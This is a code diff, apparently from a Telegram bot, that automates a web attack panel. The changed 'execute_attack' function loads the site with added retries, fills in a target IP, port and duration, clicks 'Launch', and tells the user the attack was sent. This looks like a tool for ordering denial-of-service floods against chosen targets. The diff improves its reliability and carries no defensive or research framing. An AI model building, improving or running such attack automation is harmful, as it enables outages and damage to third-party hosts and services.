@@ -271,9 +271,17 @@ async def execute_attack(update, ip, port, duration):
     global is_attack_running, current_target, page
     
     try:
-        # Go to attack page
-        await page.goto(WEBSITE_URL, wait_until='networkidle')
-        await page.wait_for_timeout(2000)
+        # Better error handling for page load
+        for attempt in range(3):
+            try:
+                await page.goto(WEBSITE_URL, wait_until='domcontentloaded', timeout=30000)
+                break
+            except:
+                if attempt == 2:
+                    await update.message.reply_text("⚠️ Website slow, retrying...")
+                await asyncio.sleep(2)
+        
+        await page.wait_for_timeout(3000)
         
         # Find input fields
         inputs = await page.query_selector_all('input[type="text"]')
@@ -284,24 +292,17 @@ async def execute_attack(update, ip, port, duration):
                 visible_inputs.append(inp)
         
         if len(visible_inputs) >= 3:
-            # Fill IP
             await visible_inputs[0].fill('')
             await visible_inputs[0].fill(ip)
-            
-            # Fill Port
             await visible_inputs[1].fill('')
             await visible_inputs[1].fill(str(port))
-            
-            # Fill Time
             await visible_inputs[2].fill('')
             await visible_inputs[2].fill(str(duration))
             
-            # Find and click launch button
             launch_btn = await page.query_selector('button:has-text("Launch")')
             if launch_btn:
                 await launch_btn.click()
                 await page.wait_for_timeout(2000)
-                
                 await update.message.reply_text("🔥 Attack sent successfully!")
             else:
                 await update.message.reply_text("❌ Launch button not found")
